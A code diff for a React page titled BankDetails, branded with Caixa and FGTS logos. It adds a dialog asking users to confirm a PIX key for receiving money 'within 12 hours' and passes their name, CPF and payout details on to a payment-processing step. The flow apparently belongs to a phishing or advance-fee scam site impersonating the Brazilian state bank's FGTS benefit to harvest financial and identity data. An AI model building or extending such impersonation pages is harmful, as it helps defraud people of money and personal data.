@@ -1,6 +1,7 @@
+
 import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { ArrowRight, CreditCard, BanknoteIcon, User, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
+import { ArrowRight, CreditCard, BanknoteIcon, User, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal, Edit } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
 import { Button } from '@/components/ui/button';
@@ -8,6 +9,7 @@ import { useIsMobile } from '@/hooks/use-mobile';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Label } from '@/components/ui/label';
 import { Input } from '@/components/ui/input';
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 
 const BankDetails = () => {
   const navigate = useNavigate();
@@ -18,6 +20,8 @@ const BankDetails = () => {
   const [bankName, setBankName] = useState('');
   const [accountNumber, setAccountNumber] = useState('');
   const [branch, setBranch] = useState('');
+  const [showPixConfirmation, setShowPixConfirmation] = useState(false);
+  const [isEditingPix, setIsEditingPix] = useState(false);
   
   // Get data from location state
   const { 
@@ -48,6 +52,14 @@ const BankDetails = () => {
   };
   
   const handleSubmit = () => {
+    if (paymentMethod === 'pix' && pixKey) {
+      setShowPixConfirmation(true);
+    } else if (paymentMethod === 'bank' && bankName && accountNumber && branch) {
+      proceedToNextPage();
+    }
+  };
+
+  const proceedToNextPage = () => {
     navigate('/payment-processing', {
       state: {
         bankLogo,
@@ -57,9 +69,15 @@ const BankDetails = () => {
         installmentValue,
         interestRate,
         userName,
-        userCPF
+        userCPF,
+        pixKey: paymentMethod === 'pix' ? pixKey : null
       }
     });
+  };
+
+  const handleConfirmPix = () => {
+    setShowPixConfirmation(false);
+    proceedToNextPage();
   };
 
   return (
@@ -77,6 +95,47 @@ const BankDetails = () => {
           Informe os dados para recebimento do valor
         </div>
       </div>
+
+      {/* PIX Confirmation Dialog */}
+      <Dialog open={showPixConfirmation} onOpenChange={setShowPixConfirmation}>
+        <DialogContent className="max-w-md mx-auto">
+          <DialogHeader>
+            <DialogTitle className="text-lg font-medium">Confirme sua chave PIX</DialogTitle>
+          </DialogHeader>
+          <div className="py-4">
+            <p className="mb-4">A chave pix inserida está correta? Confira ou insira novamente</p>
+            <div className="flex items-center mb-6">
+              <div className="flex-1 bg-gray-100 p-3 rounded-l-md border-l border-y border-gray-300">
+                {isEditingPix ? (
+                  <Input 
+                    value={pixKey}
+                    onChange={(e) => setPixKey(e.target.value)}
+                    className="border-0"
+                    placeholder="Digite sua chave PIX"
+                  />
+                ) : (
+                  <p className="font-medium">{pixKey}</p>
+                )}
+              </div>
+              <Button
+                variant="outline"
+                className="rounded-l-none border border-gray-300"
+                onClick={() => setIsEditingPix(!isEditingPix)}
+              >
+                <Edit size={16} className="mr-1" />
+                {isEditingPix ? "Pronto" : "Editar"}
+              </Button>
+            </div>
+            <p className="text-sm text-gray-500 mb-6">Enviaremos o valor para a chave informada em até 12 horas</p>
+            <Button 
+              className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white py-2"
+              onClick={handleConfirmPix}
+            >
+              CONFIRMAR PIX
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
 
       {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
